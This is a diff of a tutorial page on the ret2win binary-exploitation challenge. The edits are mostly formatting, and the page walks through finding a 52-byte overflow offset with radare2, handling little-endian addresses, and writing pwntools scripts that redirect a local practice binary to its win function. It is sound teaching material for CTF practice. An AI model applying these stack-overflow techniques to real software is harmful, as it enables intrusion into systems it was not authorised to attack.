@@ -4,24 +4,26 @@ description: The most basic binexp challenge
 
 # ret2win
 
-A **ret2win** is simply a binary where there is a `win()` function \(or equivalent\); once you successfully redirect execution there, you complete the challenge.
+A **ret2win** is simply a binary where there is a `win()` function (or equivalent); once you successfully redirect execution there, you complete the challenge.
 
 To carry this out, we have to leverage what we learnt in the **introduction**, but in a _predictable manner_ - we have to overwrite EIP, but to a specific value of our choice.
 
 To do this, what do we need to know? Well, a couple things:
 
-* The padding _until_ we begin to overwrite the return pointer \(EIP\)
+* The padding _until_ we begin to overwrite the return pointer (EIP)
 * What value we want to overwrite EIP to
 
 {% hint style="warning" %}
 When I say "overwrite EIP", I mean overwrite the saved return pointer that gets popped into EIP. The EIP register is not located on the stack, so it is not overwritten directly.
 {% endhint %}
 
-{% file src="../../.gitbook/assets/ret2win.zip" caption="ret2win" %}
+{% file src="../../.gitbook/assets/ret2win.zip" %}
+ret2win
+{% endfile %}
 
 ### Finding the Padding
 
-This can be found using simple trial and error; if we send a variable numbers of characters, we can use the `Segmentation Fault` message, in combination with radare2, to tell when we overwrote EIP. There is a better way to do it than simple brute force \(we'll cover this in the next post\), but it'll do for now.
+This can be found using simple trial and error; if we send a variable numbers of characters, we can use the `Segmentation Fault` message, in combination with radare2, to tell when we overwrote EIP. There is a better way to do it than simple brute force (we'll cover this in the next post), but it'll do for now.
 
 {% hint style="info" %}
 You may get a segmentation fault for reasons other than overwriting EIP; use a debugger to make sure the padding is correct.
@@ -33,7 +35,7 @@ We get an offset of 52 bytes.
 
 Now we need to find the address of the `flag()` function in the binary. This is simple.
 
-```text
+```
 $ r2 -d -A vuln
 $ afl
 [...]
@@ -61,7 +63,7 @@ And that makes it much easier.
 
 ### Putting it Together
 
-Now we know the padding and the value, let's exploit the binary! We can use [`pwntools`](https://github.com/Gallopsled/pwntools) to interface with the binary \(check out the [pwntools posts](../../other/pwntools/) for a more in-depth look\).
+Now we know the padding and the value, let's exploit the binary! We can use [`pwntools`](https://github.com/Gallopsled/pwntools) to interface with the binary (check out the [pwntools posts](../../other/pwntools/) for a more in-depth look).
 
 ```python
 from pwn import *        # This is how we import pwntools
@@ -85,7 +87,7 @@ from pwn import *
 
 p = process('./vuln')
 
-payload = 'A' * 52
+payload = b'A' * 52
 payload += '\x08\x04\x91\xc3'
 
 log.info(p.clean())
@@ -99,13 +101,13 @@ log.info(p.clean())
 
 Now let's run the script with `python3 exploit.py` and then open up a new terminal window.
 
-```text
+```
 r2 -d -A $(pidof vuln)
 ```
 
 By providing the PID of the process, radare2 hooks onto it. Let's break at the return of `unsafe()` and read the value of the return pointer.
 
-```text
+```
 [0x08049172]> db 0x080491aa
 [0x08049172]> dc
 
@@ -117,13 +119,13 @@ hit breakpoint at: 80491aa
 [...]
 ```
 
-`0xc3910408` - look familiar? It's the address we were trying to send over, except the bytes have been reversed, and the reason for this reversal is [endianness](https://en.wikipedia.org/wiki/Endianness). Big-endian systems store the **most significant byte** \(the byte with the largest value\) at the smallest memory address, and this is how we sent them. Little-endian does the opposite \([for a reason](https://softwareengineering.stackexchange.com/questions/95556/what-is-the-advantage-of-little-endian-format)\), and most binaries you will come across are little-endian. As far as we're concerned, the byte are stored in _reverse order_ in little-endian executables.
+`0xc3910408` - look familiar? It's the address we were trying to send over, except the bytes have been reversed, and the reason for this reversal is [endianness](https://en.wikipedia.org/wiki/Endianness). Big-endian systems store the **most significant byte** (the byte with the largest value) at the smallest memory address, and this is how we sent them. Little-endian does the opposite ([for a reason](https://softwareengineering.stackexchange.com/questions/95556/what-is-the-advantage-of-little-endian-format)), and most binaries you will come across are little-endian. As far as we're concerned, the byte are stored in _reverse order_ in little-endian executables.
 
 ### Finding the Endianness
 
 `radare2` comes with a nice tool called `rabin2` for binary analysis:
 
-```text
+```
 $ rabin2 -I vuln
 [...]
 endian   little
@@ -134,7 +136,7 @@ So our binary is **little-endian**.
 
 ### Accounting for Endianness
 
-The fix is simple - reverse the address \(you can also remove the `pause()`\)
+The fix is simple - reverse the address (you can also remove the `pause()`)
 
 ```python
 payload += '\x08\x04\x91\xc3'[::-1]
@@ -142,7 +144,7 @@ payload += '\x08\x04\x91\xc3'[::-1]
 
 If you run this now, it will work:
 
-```text
+```
 $ python3 tutorial.py 
 [+] Starting local process './vuln': pid 2290
 [*] Overflow me
@@ -175,7 +177,7 @@ payload = b'A' * 52        # Notice the "b"
 
 Otherwise you will get a
 
-```text
+```
 TypeError: can only concatenate str (not "bytes") to str
 ```
 
@@ -186,7 +188,7 @@ from pwn import *            # This is how we import pwntools
 
 p = process('./vuln')        # We're starting a new process
 
-payload = 'A' * 52
+payload = b'A' * 52
 payload += p32(0x080491c3)   # Use pwntools to pack it
 
 log.info(p.clean())          # Receive all the text
@@ -194,4 +196,3 @@ p.sendline(payload)
 
 log.info(p.clean())          # Output the "Exploited!" string to know we succeeded
 ```
-
